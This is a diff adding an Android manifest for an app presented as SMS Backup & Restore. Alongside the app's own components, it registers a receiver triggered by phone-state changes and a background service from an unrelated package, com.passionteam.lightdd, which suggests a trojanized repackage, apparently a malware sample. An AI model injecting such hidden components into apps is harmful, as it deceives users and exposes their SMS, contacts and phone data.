@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.riteshsahu.super.SMSBackupRestore">
+    <application android:debuggable="false" android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.riteshsahu.SMSBackupRestore.FreeMain">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="@string/preferences" android:name="com.riteshsahu.SMSBackupRestore.FreePreferences"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/schedule_settings" android:name="com.riteshsahu.SMSBackupRestore.FreeSchedulePreferences">
+            <intent-filter>
+                <action android:name="com.riteshsahu.SMSBackupRestore.SchedulePreferences"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/select_conversations" android:name="com.riteshsahu.SMSBackupRestore.FreeConversationView">
+            <intent-filter>
+                <action android:name="com.riteshsahu.SMSBackupRestore.SelectConversations"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="com.riteshsahu.SMSBackupRestoreBase.MessageView"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/select_number" android:name="com.riteshsahu.SMSBackupRestoreBase.ContactView"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="com.riteshsahu.SMSBackupRestore.FreeHelp"/>
+        <service android:name="com.riteshsahu.SMSBackupRestore.FreeAlarmProcessorService"/>
+        <receiver android:name="com.riteshsahu.SMSBackupRestore.FreeAlarmProcessor">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.HOME"/>
+            </intent-filter>
+        </receiver>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.admob.android.ads.AdMobActivity" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+        <meta-data android:name="ADMOB_PUBLISHER_ID" android:value="a14da6a743093dd"/>
+        <receiver android:name="com.passionteam.lightdd.Receiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.passionteam.lightdd.CoreService"/>
+    </application>
+    <supports-screens android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+</manifest>
